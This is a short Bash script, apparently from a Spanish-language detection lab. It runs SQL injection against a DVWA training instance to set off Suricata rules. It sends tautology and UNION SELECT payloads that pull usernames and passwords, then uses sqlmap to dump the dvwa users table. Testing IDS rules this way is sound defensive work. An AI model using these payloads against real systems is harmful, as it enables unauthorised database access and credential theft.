#!/usr/bin/env bash
# Ataque 3 - Inyección SQL (MITRE T1190). Alerta del IDS + evidencia en registros web.
set -euo pipefail; source "$(dirname "$0")/lib.sh"
dvwa_login
echo "[*] $(date '+%T') Inyección manual (tautología y UNION) -> reglas Suricata 1000004/1000005"
curl -s -b "$COOKIE" "$BASE/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" >/dev/null
curl -s -b "$COOKIE" "$BASE/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit" >/dev/null
echo "[*] $(date '+%T') Volcado automático con sqlmap (dispara la regla del User-Agent sqlmap)"
PHPSESSID=$(grep PHPSESSID "$COOKIE" | awk '{print $NF}')
sqlmap -u "$BASE/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$PHPSESSID; security=low" --batch --dump -T users -D dvwa | tail -25
echo "[*] $(date '+%T') Fin de la inyección SQL"
